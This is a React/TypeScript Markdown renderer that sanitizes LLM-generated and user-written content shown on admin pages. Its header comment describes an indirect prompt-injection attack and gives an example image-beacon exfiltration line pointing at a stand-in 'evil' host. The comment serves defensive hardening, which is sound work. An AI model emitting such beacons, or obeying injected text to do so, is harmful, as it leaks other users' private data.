import { useTranslations } from "next-intl";
import type { ReactNode } from "react";
import ReactMarkdown, { type Components, type Options } from "react-markdown";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import remarkGfm from "remark-gfm";

import { MermaidDiagram } from "./MermaidDiagram";

// Report / statement / free-text markdown originates from LLM output and
// host-controlled input, and was previously rendered with `rehype-raw` (raw HTML
// → DOM) WITHOUT sanitization — a stored-XSS sink (security audit H3). This is the
// single place any markdown is rendered: the plugin chain is fixed here so no call
// site can opt out. `rehype-raw` parses embedded raw HTML into the hast tree, then
// `rehype-sanitize` strips scripts, event handlers, and `javascript:` URLs using
// the GitHub default schema (which keeps `<br>`, GFM tables, and task lists).
//
// Exfiltration guard (audit 2026-10-06, H1 — PipeLeak/ShareLeak-style indirect
// prompt injection): admin pages render LLM plans / analyses / session reports
// and participant reflections through this component. A participant can write
// `![](https://evil/?d=…)` — or coax the LLM into emitting one carrying other
// participants' names and answers — and the admin's browser would GET it on
// view, with zero clicks. So:
//   - `<img>` is removed from the sanitize schema AND its renderer returns null
//     (two independent layers; neither is overridable from a call site).
//   - every link is rendered through SafeLink: `rel="noopener noreferrer
//     nofollow"`, and external targets are visibly marked and opened in a new
//     tab, so a click-through is a conscious act with the destination shown.
//   - app/lib/csp.ts additionally restricts `img-src` so nothing else on the
//     page can be turned into a beacon either.
const SANITIZE_SCHEMA = {
  ...defaultSchema,
  tagNames: (defaultSchema.tagNames ?? []).filter((tag) => tag !== "img"),
};

const REMARK_PLUGINS = [remarkGfm] as const;
// Built per render (cheap: two references) because react-markdown's
// `PluggableList` type is mutable and rejects a module-level `as const` tuple.
const rehypePlugins = (): NonNullable<Options["rehypePlugins"]> => [
  rehypeRaw,
  [rehypeSanitize, SANITIZE_SCHEMA],
];

// hast ノードの最小形 (react-markdown が component に渡す `node`)。
type HastNode = {
  tagName?: string;
  properties?: { className?: unknown };
  children?: HastNode[];
  value?: string;
};

// ```mermaid フェンス(pre>code.language-mermaid)なら中身のソースを返す。
const mermaidSource = (node: HastNode | undefined): string | null => {
  const code = node?.children?.[0];
  if (!code || code.tagName !== "code") return null;
  const cls = code.properties?.className;
  const isMermaid = Array.isArray(cls) && cls.includes("language-mermaid");
  const text = code.children?.[0]?.value;
  return isMermaid && typeof text === "string" ? text : null;
};

// ```mermaid を図に差し替える。React コンポーネント経由なので raw HTML/SVG を
// hast に流さず、rehype-sanitize の防御(H3対策)はそのまま保たれる。
const MERMAID_COMPONENTS: Components = {
  pre({ node, children, ...rest }) {
    const src = mermaidSource(node as unknown as HastNode | undefined);
    return src != null ? (
      <MermaidDiagram chart={src} />
    ) : (
      <pre {...rest}>{children as ReactNode}</pre>
    );
  },
};

// A link leaves the app when it carries a scheme (`https:`, `mailto:`, …) or is
// protocol-relative. Fragments and site-relative paths stay internal.
export const isExternalHref = (href: string | undefined): boolean =>
  typeof href === "string" && /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(href.trim());

const SAFE_REL = "noopener noreferrer nofollow";

const SafeLink: NonNullable<Components["a"]> = ({
  node: _node,
  href,
  children,
  ...rest
}) => {
  const t = useTranslations("markdown");
  const external = isExternalHref(href);
  return external ? (
    <a
      {...rest}
      href={href}
      rel={SAFE_REL}
      target="_blank"
      data-external-link="true"
      title={t("externalLinkTitle", { href: href ?? "" })}
    >
      {children as ReactNode}
      <span aria-hidden="true" className="ml-0.5 select-none text-xs">
        ↗
      </span>
      <span className="sr-only">{t("externalLink")}</span>
    </a>
  ) : (
    <a {...rest} href={href} rel={SAFE_REL}>
      {children as ReactNode}
    </a>
  );
};

// Applied LAST in the components merge so a caller cannot reinstate `<img>` or
// swap in a link renderer without the rel / external marking.
const GUARD_COMPONENTS: Components = {
  img: () => null,
  a: SafeLink,
};

type MarkdownProps = Readonly<{
  children: string;
  // Element renderers only — plugins are intentionally not overridable so the
  // sanitize step can never be bypassed (e.g. the report page maps statement tags).
  // `img` and `a` are likewise fixed (see GUARD_COMPONENTS).
  components?: Components;
}>;

export const Markdown = ({ children, components }: MarkdownProps) => (
  <ReactMarkdown
    remarkPlugins={[...REMARK_PLUGINS]}
    rehypePlugins={rehypePlugins()}
    components={{ ...MERMAID_COMPONENTS, ...components, ...GUARD_COMPONENTS }}
  >
    {children}
  </ReactMarkdown>
);
